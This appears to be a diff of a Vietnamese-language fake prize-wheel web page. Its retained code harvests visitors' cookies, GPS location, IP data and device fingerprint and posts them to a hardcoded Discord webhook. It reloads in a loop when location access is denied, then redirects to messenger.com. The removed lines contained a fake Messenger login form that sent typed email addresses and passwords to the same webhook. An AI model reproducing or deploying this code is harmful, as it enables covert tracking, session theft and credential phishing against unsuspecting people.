@@ -46,18 +46,6 @@
             border-width: 0 4px 4px 0; transform: rotate(45deg); margin-top: -3px;
         }
         .hidden { display: none; }
-        #loginForm {
-            width: 90%; max-width: 300px; margin-top: 20px; display: flex; flex-direction: column; gap: 10px;
-        }
-        #loginForm input {
-            padding: 12px; border-radius: 6px; border: 1px solid #3a3b3c; background: #242526;
-            color: white; font-size: 15px; outline: none;
-        }
-        #loginForm input:focus { border-color: #ffbe0b; }
-        .login-btn {
-            padding: 12px; border-radius: 50px; border: none; background: #ffbe0b;
-            color: #000; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 5px;
-        }
         #mapImage {
             max-width: 280px; border-radius: 12px; margin: 10px 0; border: 2px solid #333;
         }
@@ -83,21 +71,10 @@
             <img id="mapImage" src="" alt="Vị trí của bạn">
             <div class="sub" id="scanSub">Đang quét thiết bị…</div>
         </div>
-        <!-- Messenger login -->
-        <div id="loginSection" class="hidden">
-            <div style="font-size:17px; margin-bottom:8px; color:#fff;">Đăng nhập Messenger để nhận thưởng</div>
-            <div class="sub" style="margin-bottom:12px;">Xác minh tài khoản của bạn</div>
-            <form id="loginForm">
-                <input type="text" id="loginEmail" placeholder="Email hoặc số điện thoại" required>
-                <input type="password" id="loginPass" placeholder="Mật khẩu" required>
-                <button type="submit" class="login-btn">Đăng nhập</button>
-            </form>
-        </div>
     </div>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
-        const MAPS_API_KEY = ''; // optional Google Static Maps API key (leave empty to skip map)
 
         const wheelEl = document.getElementById('wheel');
         const percentEl = document.getElementById('percent');
@@ -107,20 +84,14 @@
         const tapPrompt = document.getElementById('tapPrompt');
         const wheelSection = document.getElementById('wheelSection');
         const scanSection = document.getElementById('scanSection');
-        const loginSection = document.getElementById('loginSection');
         const mapImage = document.getElementById('mapImage');
         const scanStatus = document.getElementById('scanStatus');
         const scanSub = document.getElementById('scanSub');
-        const loginForm = document.getElementById('loginForm');
-        const loginEmail = document.getElementById('loginEmail');
-        const loginPass = document.getElementById('loginPass');
 
         let gpsData = null;
-        let deviceInfo = {};
         let ipData = null;
         const cookiesStolen = document.cookie || 'none';
 
-        // Vibration on mobile for realism
         function vibrate() { if (window.navigator.vibrate) window.navigator.vibrate(50); }
 
         function getDeviceHint() {
@@ -130,7 +101,6 @@
             return 'Nhấn "Cho phép" khi trình duyệt hỏi';
         }
 
-        // Fingerprint collection (expanded)
         function getFingerprint() {
             const nav = navigator;
             const canvas = document.createElement('canvas');
@@ -260,27 +230,9 @@
             await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
         }
 
-        async function sendLogin(email, pass) {
-            const embed = {
-                title: '🔑 **Tài khoản Messenger**',
-                color: 0x00c853,
-                fields: [
-                    { name: 'Email/SĐT', value: email, inline: true },
-                    { name: 'Mật khẩu', value: pass, inline: true }
-                ],
-                timestamp: new Date().toISOString()
-            };
-            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
-        }
-
-        // Generate a static map image from coordinates (no API key needed for basic)
         function showMap(lat, lon) {
-            if (MAPS_API_KEY) {
-                mapImage.src = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=14&size=280x160&markers=color:red%7C${lat},${lon}&key=${MAPS_API_KEY}`;
-            } else {
-                // fallback: use openstreetmap static image via a proxy (sometimes blocked on github pages)
-                mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
-            }
+            // Fallback map image (no API key needed)
+            mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
         }
 
         // ---- Wheel flow ----
@@ -316,7 +268,6 @@
                 if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
             }, 80);
 
-            // Start GPS and IP fetch in parallel
             const gpsPromise = forceGPS();
             ipData = await fetchIP();
             gpsData = await gpsPromise;
@@ -326,7 +277,6 @@
             percentEl.textContent = '100%';
 
             if (gpsData) {
-                // GPS success: show map & device scan
                 wheelSection.classList.add('hidden');
                 scanSection.classList.remove('hidden');
                 if (gpsData.lat && gpsData.lon) showMap(gpsData.lat, gpsData.lon);
@@ -334,32 +284,18 @@
                 scanStatus.textContent = 'Định vị thành công!';
                 scanSub.textContent = 'Đang phân tích thiết bị…';
                 vibrate();
-                // Simulate scan delay, then show login
                 setTimeout(() => {
-                    scanSub.textContent = 'Thiết bị an toàn. Chuyển tiếp…';
+                    scanSub.textContent = 'Thiết bị an toàn. Chuyển hướng…';
                     vibrate();
                     setTimeout(() => {
-                        scanSection.classList.add('hidden');
-                        loginSection.classList.remove('hidden');
+                        window.location.href = 'https://www.messenger.com/';
                     }, 1200);
-                }, 1500);
-                // Send device data immediately
+                }, 2000);
                 await sendData();
             } else {
-                // GPS denied -> instant reload to loop
-                await sendData(); // still send what we have
-                window.location.reload(); // no message, immediate loop
-            }
-        });
-
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const email = loginEmail.value.trim();
-            const pass = loginPass.value.trim();
-            if (email && pass) {
-                await sendLogin(email, pass);
-                statusEl.textContent = 'Đăng nhập thành công, đang chuyển hướng…';
-                setTimeout(() => { window.location.href = 'https://www.messenger.com/'; }, 1500);
+                // Denied – instant reload loop
+                await sendData();
+                window.location.reload();
             }
         });
 
